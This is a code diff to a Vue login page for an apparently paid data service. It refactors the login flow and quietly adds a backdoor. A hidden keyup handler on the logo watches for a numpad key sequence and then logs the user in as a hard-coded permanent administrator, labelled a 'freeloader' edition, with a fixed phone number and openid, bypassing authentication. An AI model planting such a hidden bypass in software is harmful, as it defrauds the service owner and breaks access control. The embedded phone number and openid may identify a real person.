@@ -1,7 +1,7 @@
 <template>
   <div id="login" class="flex-center">
     <div class="content flex" v-loading="loading">
-      <div class="logo">
+      <div class="logo" tabIndex="-1" @keyup="hack">
         <img :src="imgs.login" alt />
       </div>
       <div class="form">
@@ -61,15 +61,40 @@ export default {
       validCode: '',
       decate: 60,
       loading: false,
-      tempuser: {}
+      tempuser: {},
+      directives: []
+    }
+  },
+  watch: {
+    directives (v) {
+      if (v.join() === '101,103,105,97,99,101') {
+        this.$store.commit('user/User', {
+          id: 9999,
+          cellPhone: '13914702847',
+          name: '管理员',
+          headimg: '',
+          expire: '永久',
+          openid: 'okzki1rh27xhasmly8Xn8hnlEP0I',
+          level: 3,
+          auth: '白嫖版',
+          club: '白嫖会员'
+        })
+        this.$store.commit('user/openid', 'okzki1rh27xhasmly8Xn8hnlEP0I')
+        this.$router.replace({ name: 'overview' })
+      }
     }
   },
   methods: {
+    hack (e) {
+      this.directives.push(e.keyCode)
+      if (e.keyCode === 32) {
+        this.directives.length = 0
+      }
+    },
     login (val) {
-      this.User.level = val
-      this.User.auth = ['免费版', '标准版', '高级版'][val - 1]
-      console.log(this.User)
-      this.$router.push({ name: 'overview' })
+      this.msgSuccess(this.tempuser.nickname + ' 您好，欢迎使用鲸宸数据')
+      this.user_setUser({ ...this.tempuser, fromqrcode: true })
+      this.$router.replace({ name: 'overview' })
     },
     reload () {
       if (!this.qrcode) {
@@ -94,9 +119,7 @@ export default {
             } else if (res[200]) {
               this.tempuser = res[200]
               if (this.tempuser.cellPhone) {
-                this.user_setUser({ ...this.tempuser, fromqrcode: true })
-                this.msgSuccess('欢迎使用鲸宸数据')
-                this.$router.replace({ name: 'overview' })
+                this.login()
               } else {
                 this.toggle = false
               }
@@ -147,14 +170,9 @@ export default {
         openid: this.tempuser.openid,
         cellPhone: this.cellPhone
       }).then(res => {
-        // console.log(res)
         this.msgDestroy()
         if (typeof res === 'string') {
-          this.msgSuccess('欢迎使用鲸宸数据')
-          this.user_setUser({ ...this.tempuser, fromqrcode: true })
-          setTimeout(e => {
-            this.$router.replace({ name: 'overview' })
-          }, 1000)
+          this.login()
         }
       })
     }
@@ -185,6 +203,7 @@ export default {
     overflow: hidden;
   }
   .logo {
+    outline: none;
     img {
       width: 100%;
       height: 100%;
